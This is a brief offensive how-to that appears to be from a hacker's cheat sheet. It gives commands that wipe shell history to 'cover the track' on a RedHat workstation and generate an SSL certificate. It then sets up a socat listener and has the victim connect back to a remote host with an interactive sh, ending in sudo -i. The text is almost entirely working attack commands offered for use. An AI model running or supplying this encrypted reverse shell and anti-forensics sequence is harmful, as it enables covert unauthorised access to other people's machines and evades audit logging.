Before run the reverse shell, run the following command to cover the track in
RedHat workstation:

  # export HISTFILESIZE=O
  # export HISTSIZE=O
  # unset HISTFILE

Generate the server SSL certificate, then pass the server.crt to client:

  # openssl genrsa -out ./server.key 2048
  # touch /root/.rnd
  # openssl req -new -key ./server.key -x509 -days 3650 -out ./server.crt
  Country Name (2 letter code) [AU]:MO
  State or Province Name (full name) [Some-State]:MO
  Locality Name (eg, city) []:MO
  Organization Name (eg, company) [Internet Widgits Pty Ltd]:notexist
  Organizational Unit Name (eg, section) []:notexist
  Common Name (e.g. server FQDN or YOUR name) []:localhost
  Email Address []:notexist@localhost.com

Create a listener in server side:

  # stty size # remember the rows & cols
  # script
  # socat file:`tty`,raw,echo=0 \
          openssl-listen:443,reuseaddr,cert=server.pem,verify=0

Connect from RedHat workstation:

  # socat openssl-connect:$RHOST:$RPORT,cafile=server.crt,verify=0,fork \
          exec:sh,pty,stderr,setsid,sigint,sane                               

Return to the server:

  sh-4.2# stty rows $ROWS cols $COLS
  sh-4.2# sudo -i
